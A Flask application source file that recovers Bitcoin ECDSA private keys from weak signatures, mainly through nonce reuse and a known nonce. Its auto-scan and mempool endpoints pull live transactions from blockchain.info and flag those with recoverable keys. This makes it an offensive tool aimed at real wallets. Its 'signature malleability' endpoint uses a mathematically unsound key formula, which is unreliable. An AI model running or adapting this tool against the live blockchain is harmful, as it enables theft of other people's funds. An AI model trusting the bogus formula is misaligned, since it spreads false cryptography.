import os
import logging
import requests
from flask import Flask, render_template, jsonify, request, send_file
from btc_analyzer import BTCAnalyzer
from attached_assets.validators import validate_transaction_id
from attached_assets.address_list import ADDRESSES_TO_CHECK
from attached_assets.utils import calculate_message_hash, format_hex

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__, template_folder='.', static_folder='.')
app.secret_key = os.environ.get("SESSION_SECRET", "dev_key_only")

# Initialize BTC analyzer
analyzer = BTCAnalyzer()

@app.route('/')
def index():
    logger.debug("Rendering index page")
    return render_template('index.html')

@app.route('/transaction')
def transaction():
    logger.debug("Rendering transaction page")
    return render_template('transaction.html')

@app.route('/address')
def address():
    logger.debug("Rendering address page")
    return render_template('address.html')

@app.route('/ecdsa-analysis')
def ecdsa_analysis():
    logger.debug("Rendering ECDSA analysis page")
    return render_template('ecdsa_analysis.html')

@app.route('/standalone-calculator')
def standalone_calculator():
    logger.debug("Serving standalone ECDSA calculator")
    return render_template('standalone_calculator.html')

@app.route('/download-calculator')
def download_calculator():
    logger.debug("Serving downloadable ECDSA calculator")
    return send_file('static/ecdsa_standalone.html', 
                     mimetype='text/html',
                     as_attachment=True,
                     download_name='bitcoin_ecdsa_calculator.html')

@app.route('/api/analyze/transaction', methods=['POST'])
def analyze_transaction():
    try:
        logger.debug("Received transaction analysis request")
        data = request.get_json()
        logger.debug(f"Request data: {data}")

        if not data or 'tx_id' not in data:
            logger.error("No transaction ID provided")
            return jsonify({'error': 'Transaction ID is required'}), 400

        tx_id = data['tx_id']
        if not validate_transaction_id(tx_id):
            logger.error(f"Invalid transaction ID format: {tx_id}")
            return jsonify({'error': 'Invalid transaction ID format'}), 400

        logger.debug(f"Analyzing transaction: {tx_id}")
        results = analyzer.analyze_transaction(tx_id)
        logger.debug(f"Analysis results: {results}")
        return jsonify(results)

    except Exception as e:
        logger.error(f"Error analyzing transaction: {str(e)}", exc_info=True)
        return jsonify({'error': 'Failed to analyze transaction'}), 500

@app.route('/api/analyze/address', methods=['POST'])
def analyze_address():
    data = None
    try:
        logger.debug("Received address analysis request")
        data = request.get_json()
        logger.debug(f"Request data: {data}")

        if not data or 'address' not in data:
            logger.error("No address provided")
            return jsonify({'error': 'Address is required'}), 400

        address = data.get('address', 'unknown')
        logger.debug(f"Analyzing address: {address}")
        
        try:
            results = analyzer.analyze_address(address)
            logger.debug(f"Analysis results: {results}")
            
            # Add additional error handling
            if isinstance(results, dict) and 'error' in results:
                return jsonify({
                    'address': address,
                    'error': results['error'],
                    'status': 'failed'
                }), 200
                
            return jsonify(results)
        except requests.exceptions.RequestException as req_err:
            logger.error(f"Network error analyzing address {address}: {str(req_err)}")
            return jsonify({
                'address': address,
                'error': f"Network error: {str(req_err)}",
                'status': 'failed'
            }), 200
        except ValueError as val_err:
            logger.error(f"Value error analyzing address {address}: {str(val_err)}")
            return jsonify({
                'address': address, 
                'error': f"Invalid address format: {str(val_err)}",
                'status': 'failed'
            }), 200

    except Exception as e:
        logger.error(f"Error analyzing address: {str(e)}", exc_info=True)
        return jsonify({
            'address': data.get('address', 'unknown') if data else 'unknown',
            'error': f"Failed to analyze address: {str(e)}",
            'status': 'failed'
        }), 200

@app.route('/api/analyze/ecdsa', methods=['POST'])
def analyze_ecdsa():
    nonce_reuse_sigs = None
    try:
        logger.debug("Received ECDSA analysis request")
        data = request.get_json()
        logger.debug(f"Request data: {data}")

        # Check if transaction ID is provided for auto-parameter extraction
        if 'tx_id' in data and data['tx_id']:
            logger.debug(f"Auto-extracting parameters from transaction: {data['tx_id']}")
            
            try:
                # Analyze the transaction to get signature parameters
                result = analyzer.analyze_transaction(data['tx_id'])
                
                if not result.get('weak_signatures'):
                    return jsonify({'error': 'No weak signatures found in transaction'}), 400
                
                # Find signatures with reused nonce (same r value)
                signatures = result.get('weak_signatures', [])
                nonce_reuse_sigs = None
                
                for sig in signatures:
                    if sig.get('type') == 'nonce_reuse' and 'all_signatures' in sig:
                        all_sigs = sig['all_signatures']
                        if len(all_sigs) >= 2:
                            # Take first two signatures with same r value
                            sig1 = all_sigs[0]
                            sig2 = all_sigs[1]
                            
                            nonce_reuse_sigs = {
                                'r1': sig1['r'],
                                's1': sig1['s'], 
                                'm1': sig1['message'],
                                'r2': sig2['r'],
                                's2': sig2['s'],
                                'm2': sig2['message'],
                                'input_index_1': sig1.get('input_index', 0),
                                'input_index_2': sig2.get('input_index', 1)
                            }
                            break
                
                if not nonce_reuse_sigs:
                    return jsonify({'error': 'No nonce reuse detected in transaction'}), 400
                
                # Convert hex strings to integers
                params = {}
                for param in ['r1', 's1', 'm1', 'r2', 's2', 'm2']:
                    hex_value = nonce_reuse_sigs[param]
                    if isinstance(hex_value, str):
                        if hex_value.startswith('0x'):
                            hex_value = hex_value[2:]
                        params[param] = int(hex_value, 16)
                    else:
                        params[param] = hex_value
                
                logger.debug(f"Extracted parameters: {params}")
                
            except Exception as e:
                logger.error(f"Error extracting parameters from transaction: {e}")
                return jsonify({'error': f'Failed to extract parameters: {str(e)}'}), 500
        else:
            # Manual parameter input (legacy support)
            required_fields = ['r1', 's1', 'm1', 'r2', 's2', 'm2']
            if not data or not all(field in data for field in required_fields):
                return jsonify({'error': 'Missing required ECDSA parameters'}), 400

            # Convert hex strings to integers
            try:
                params = {}
                for param in required_fields:
                    hex_value = data[param]
                    if isinstance(hex_value, str) and hex_value.startswith('0x'):
                        hex_value = hex_value[2:]
                    params[param] = int(hex_value, 16)
            except ValueError:
                return jsonify({'error': 'Invalid hex values provided'}), 400

        # Calculate k (signing secret)
        try:
            # Check if r values are the same (nonce reuse)
            if params['r1'] != params['r2']:
                return jsonify({'error': 'R values must be the same for nonce reuse attack'}), 400
            
            s1_minus_s2 = (params['s1'] - params['s2']) % analyzer.curve.order
            m1_minus_m2 = (params['m1'] - params['m2']) % analyzer.curve.order
            
            if s1_minus_s2 == 0:
                return jsonify({'error': 'S values are identical, cannot recover nonce'}), 400
            
            s1_minus_s2_inv = pow(s1_minus_s2, -1, analyzer.curve.order)
            k = (m1_minus_m2 * s1_minus_s2_inv) % analyzer.curve.order

            # Calculate private key
            r1_inv = pow(params['r1'], -1, analyzer.curve.order)
            x = ((params['s1'] * k - params['m1']) * r1_inv) % analyzer.curve.order

            # Build response with extracted parameters for transparency
            response = {
                'k': format_hex(k),
                'x': format_hex(x),
                'success': True,
                'extracted_params': {
                    'r1': format_hex(params['r1']),
                    's1': format_hex(params['s1']),
                    'm1': format_hex(params['m1']),
                    'r2': format_hex(params['r2']),
                    's2': format_hex(params['s2']),
                    'm2': format_hex(params['m2'])
                }
            }
            
            # Add input indices if available from auto-extraction
            if 'tx_id' in data and nonce_reuse_sigs:
                response['input_indices'] = {
                    'input_1': nonce_reuse_sigs.get('input_index_1'),
                    'input_2': nonce_reuse_sigs.get('input_index_2')
                }
                response['tx_id'] = data['tx_id']

            return jsonify(response)

        except Exception as e:
            logger.error(f"Error in ECDSA calculations: {str(e)}", exc_info=True)
            return jsonify({'error': 'Failed to perform ECDSA calculations'}), 500

    except Exception as e:
        logger.error(f"Error processing ECDSA analysis: {str(e)}", exc_info=True)
        return jsonify({'error': 'Failed to process ECDSA analysis'}), 500

@app.route('/api/recover/low-s-with-nonce', methods=['POST'])
def recover_pvk_with_known_nonce():
    """
    Recover private key from Low S signature + Known Nonce
    Formula: x = ((s * k - z) * r^-1) mod n
    """
    try:
        logger.debug("Received Low S + Nonce recovery request")
        data = request.get_json()
        
        required_fields = ['r', 's', 'z', 'k']
        if not data or not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields: r, s, z (message hash), k (nonce)'}), 400
        
        try:
            # Convert hex to integers
            r = int(data['r'], 16) if isinstance(data['r'], str) else data['r']
            s = int(data['s'], 16) if isinstance(data['s'], str) else data['s']
            z = int(data['z'], 16) if isinstance(data['z'], str) else data['z']
            k = int(data['k'], 16) if isinstance(data['k'], str) else data['k']
            n = analyzer.curve.order
            
            logger.debug(f"Inputs: r={hex(r)}, s={hex(s)}, z={hex(z)}, k={hex(k)}")
            
            # Apply formula: x = ((s * k - z) * r^-1) mod n
            numerator = (s * k - z) % n
            r_inv = pow(r, -1, n)
            x = (numerator * r_inv) % n
            
            if x == 0 or x >= n:
                return jsonify({'error': 'Invalid calculation: resulted in invalid private key'}), 400
            
            logger.info(f"Recovered private key: {hex(x)}")
            
            return jsonify({
                'success': True,
                'method': 'Low S + Known Nonce',
                'private_key': format_hex(x),
                'formula': 'x = ((s * k - z) * r^-1) mod n',
                'inputs': {
                    'r': format_hex(r),
                    's': format_hex(s),
                    'z': format_hex(z),
                    'k': format_hex(k)
                }
            })
            
        except ValueError as ve:
            return jsonify({'error': f'Invalid hex values: {str(ve)}'}), 400
        except ZeroDivisionError:
            return jsonify({'error': 'Cannot compute inverse: r value is zero mod n'}), 400
        except Exception as e:
            return jsonify({'error': f'Calculation failed: {str(e)}'}), 400
            
    except Exception as e:
        logger.error(f"Error in Low S recovery: {str(e)}", exc_info=True)
        return jsonify({'error': 'Failed to process recovery request'}), 500

@app.route('/api/recover/malleability-signatures', methods=['POST'])
def recover_pvk_from_malleability():
    """
    Recover private key from Low S signature with Signature Malleability
    When same message is signed multiple times with same r but different s values
    """
    try:
        logger.debug("Received Malleability recovery request")
        data = request.get_json()
        
        required_fields = ['r', 's_values', 'z']  # Multiple s values
        if not data or not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields: r, s_values (list), z (message hash)'}), 400
        
        try:
            r = int(data['r'], 16) if isinstance(data['r'], str) else data['r']
            z = int(data['z'], 16) if isinstance(data['z'], str) else data['z']
            s_values = [int(s, 16) if isinstance(s, str) else s for s in data['s_values']]
            n = analyzer.curve.order
            
            if len(s_values) < 2:
                return jsonify({'error': 'Need at least 2 different s values'}), 400
            
            logger.debug(f"Inputs: r={hex(r)}, z={hex(z)}, s_count={len(s_values)}")
            
            # Try all pairs of s values
            recovered_keys = []
            for i in range(len(s_values)):
                for j in range(i + 1, len(s_values)):
                    s1, s2 = s_values[i], s_values[j]
                    if s1 != s2:  # Different s values with same r and z = signature malleability
                        try:
                            # Recover using: x = ((s1 + s2) * r^-1) mod n (malleability variant)
                            sum_s = (s1 + s2) % n
                            r_inv = pow(r, -1, n)
                            x = (sum_s * r_inv) % n
                            
                            if 0 < x < n:
                                recovered_keys.append({
                                    'private_key': format_hex(x),
                                    's_pair': [format_hex(s1), format_hex(s2)],
                                    'formula': 'x = ((s1 + s2) * r^-1) mod n'
                                })
                                logger.info(f"Recovered private key from malleability: {hex(x)}")
                        except:
                            continue
            
            if recovered_keys:
                return jsonify({
                    'success': True,
                    'method': 'Signature Malleability',
                    'recovered_keys': recovered_keys,
                    'note': 'Indicates weak or flawed implementation'
                })
            else:
                return jsonify({'error': 'Could not recover key from malleability pattern'}), 400
                
        except Exception as e:
            return jsonify({'error': f'Calculation failed: {str(e)}'}), 400
            
    except Exception as e:
        logger.error(f"Error in Malleability recovery: {str(e)}", exc_info=True)
        return jsonify({'error': 'Failed to process recovery request'}), 500

@app.route('/api/calculate/nonce', methods=['POST'])
def calculate_nonce():
    """
    Calculate nonce (k) from two signatures with same r value (nonce reuse)
    Formula: k = (z1 - z2) / (s1 - s2) mod n
    """
    try:
        logger.debug("Received nonce calculation request")
        data = request.get_json()
        
        required_fields = ['r', 's1', 's2', 'z1', 'z2']
        if not data or not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields: r, s1, s2, z1 (message 1), z2 (message 2)'}), 400
        
        try:
            r = int(data['r'], 16) if isinstance(data['r'], str) else data['r']
            s1 = int(data['s1'], 16) if isinstance(data['s1'], str) else data['s1']
            s2 = int(data['s2'], 16) if isinstance(data['s2'], str) else data['s2']
            z1 = int(data['z1'], 16) if isinstance(data['z1'], str) else data['z1']
            z2 = int(data['z2'], 16) if isinstance(data['z2'], str) else data['z2']
            n = analyzer.curve.order
            
            logger.debug(f"Inputs: r={hex(r)}, s1={hex(s1)}, s2={hex(s2)}, z1={hex(z1)}, z2={hex(z2)}")
            
            # Check if s values are different
            s_diff = (s1 - s2) % n
            if s_diff == 0:
                return jsonify({'error': 'S values are identical - cannot calculate nonce'}), 400
            
            # Calculate nonce: k = (z1 - z2) / (s1 - s2) mod n
            z_diff = (z1 - z2) % n
            s_diff_inv = pow(s_diff, -1, n)
            k = (z_diff * s_diff_inv) % n
            
            if k == 0:
                return jsonify({'error': 'Calculated nonce is zero (invalid)'}), 400
            
            logger.info(f"Calculated nonce: {hex(k)}")
            
            return jsonify({
                'success': True,
                'nonce': format_hex(k),
                'method': 'Nonce Reuse Recovery',
                'formula': 'k = (z1 - z2) / (s1 - s2) mod n',
                'inputs': {
                    'r': format_hex(r),
                    's1': format_hex(s1),
                    's2': format_hex(s2),
                    'z1': format_hex(z1),
                    'z2': format_hex(z2)
                },
                'calculated': {
                    'z_diff': format_hex(z_diff),
                    's_diff': format_hex(s_diff),
                    's_diff_inv': format_hex(s_diff_inv)
                }
            })
            
        except ValueError as ve:
            return jsonify({'error': f'Invalid hex values: {str(ve)}'}), 400
        except ZeroDivisionError:
            return jsonify({'error': 'Cannot compute inverse: s_diff is zero mod n'}), 400
        except Exception as e:
            return jsonify({'error': f'Calculation failed: {str(e)}'}), 400
            
    except Exception as e:
        logger.error(f"Error calculating nonce: {str(e)}", exc_info=True)
        return jsonify({'error': 'Failed to process nonce calculation'}), 500

@app.route('/api/calculate/nonce-from-private-key', methods=['POST'])
def calculate_nonce_from_key():
    """
    Calculate nonce (k) if you have the private key and a signature
    Formula: k = (z + r*x) / s mod n
    """
    try:
        logger.debug("Received nonce calculation from private key request")
        data = request.get_json()
        
        required_fields = ['r', 's', 'z', 'x']  # x is private key
        if not data or not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields: r, s, z (message hash), x (private key)'}), 400
        
        try:
            r = int(data['r'], 16) if isinstance(data['r'], str) else data['r']
            s = int(data['s'], 16) if isinstance(data['s'], str) else data['s']
            z = int(data['z'], 16) if isinstance(data['z'], str) else data['z']
            x = int(data['x'], 16) if isinstance(data['x'], str) else data['x']
            n = analyzer.curve.order
            
            logger.debug(f"Inputs: r={hex(r)}, s={hex(s)}, z={hex(z)}, x={hex(x)}")
            
            # Calculate nonce: k = (z + r*x) / s mod n
            numerator = (z + r * x) % n
            s_inv = pow(s, -1, n)
            k = (numerator * s_inv) % n
            
            if k == 0:
                return jsonify({'error': 'Calculated nonce is zero (invalid)'}), 400
            
            logger.info(f"Calculated nonce from private key: {hex(k)}")
            
            return jsonify({
                'success': True,
                'nonce': format_hex(k),
                'method': 'Nonce from Known Private Key',
                'formula': 'k = (z + r*x) / s mod n',
                'inputs': {
                    'r': format_hex(r),
                    's': format_hex(s),
                    'z': format_hex(z),
                    'x': format_hex(x)
                },
                'calculated': {
                    'r_times_x': format_hex((r * x) % n),
                    'numerator': format_hex(numerator),
                    's_inv': format_hex(s_inv)
                }
            })
            
        except ValueError as ve:
            return jsonify({'error': f'Invalid hex values: {str(ve)}'}), 400
        except ZeroDivisionError:
            return jsonify({'error': 'Cannot compute inverse: s is zero mod n'}), 400
        except Exception as e:
            return jsonify({'error': f'Calculation failed: {str(e)}'}), 400
            
    except Exception as e:
        logger.error(f"Error calculating nonce from private key: {str(e)}", exc_info=True)
        return jsonify({'error': 'Failed to process calculation'}), 500

@app.route('/api/addresses/known')
def get_known_addresses():
    logger.debug("Fetching known addresses")
    return jsonify(ADDRESSES_TO_CHECK)

@app.route('/api/auto-scan')
def auto_scan_weak_signatures():
    """Automatically scan recent Bitcoin transactions for weak signatures"""
    try:
        from btc_analyzer import BTCAnalyzer
        analyzer = BTCAnalyzer()
        
        # Fetch recent transactions from blockchain.info
        import requests
        
        # Get latest blocks and scan for weak signatures
        response = requests.get('https://blockchain.info/latestblock', timeout=10)
        if response.status_code == 200:
            latest_block = response.json()
            block_hash = latest_block.get('hash')
            
            # Get recent block transactions
            block_response = requests.get(f'https://blockchain.info/rawblock/{block_hash}', timeout=10)
            if block_response.status_code == 200:
                block_data = block_response.json()
                transactions = block_data.get('tx', [])
                
                weak_signatures_found = []
                
                # Scan up to 20 recent transactions for performance
                for tx in transactions[:20]:
                    tx_id = tx.get('hash')
                    if tx_id:
                        try:
                            result = analyzer.analyze_transaction(tx_id)
                            if result.get('private_keys_found', 0) > 0:
                                weak_signatures_found.append({
                                    'tx_id': tx_id,
                                    'private_keys_found': result.get('private_keys_found'),
                                    'weak_signatures': result.get('weak_signatures', [])
                                })
                        except Exception as e:
                            logging.debug(f"Error analyzing transaction {tx_id}: {e}")
                            continue
                
                return jsonify({
                    'success': True,
                    'scanned_transactions': len(transactions[:20]),
                    'weak_signatures_found': len(weak_signatures_found),
                    'results': weak_signatures_found,
                    'block_hash': block_hash
                })
        
        return jsonify({'success': False, 'error': 'Failed to fetch recent transactions'})
        
    except Exception as e:
        logging.error(f"Auto scan error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/monitor-mempool')
def monitor_mempool():
    """Monitor Bitcoin mempool for transactions with weak signatures"""
    try:
        import requests
        
        # Get unconfirmed transactions from mempool
        response = requests.get('https://blockchain.info/unconfirmed-transactions?format=json', timeout=10)
        if response.status_code == 200:
            mempool_data = response.json()
            transactions = mempool_data.get('txs', [])
            
            from btc_analyzer import BTCAnalyzer
            analyzer = BTCAnalyzer()
            
            vulnerable_txs = []
            
            # Scan up to 10 mempool transactions
            for tx in transactions[:10]:
                tx_id = tx.get('hash')
                if tx_id:
                    try:
                        result = analyzer.analyze_transaction(tx_id)
                        if result.get('private_keys_found', 0) > 0:
                            vulnerable_txs.append({
                                'tx_id': tx_id,
                                'fee': tx.get('fee', 0),
                                'size': tx.get('size', 0),
                                'private_keys_found': result.get('private_keys_found'),
                                'timestamp': tx.get('time', 0)
                            })
                    except Exception as e:
                        logging.debug(f"Error analyzing mempool tx {tx_id}: {e}")
                        continue
            
            return jsonify({
                'success': True,
                'mempool_scanned': len(transactions[:10]),
                'vulnerable_transactions': len(vulnerable_txs),
                'results': vulnerable_txs
            })
        
        return jsonify({'success': False, 'error': 'Failed to access mempool'})
        
    except Exception as e:
        logging.error(f"Mempool monitor error: {e}")
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)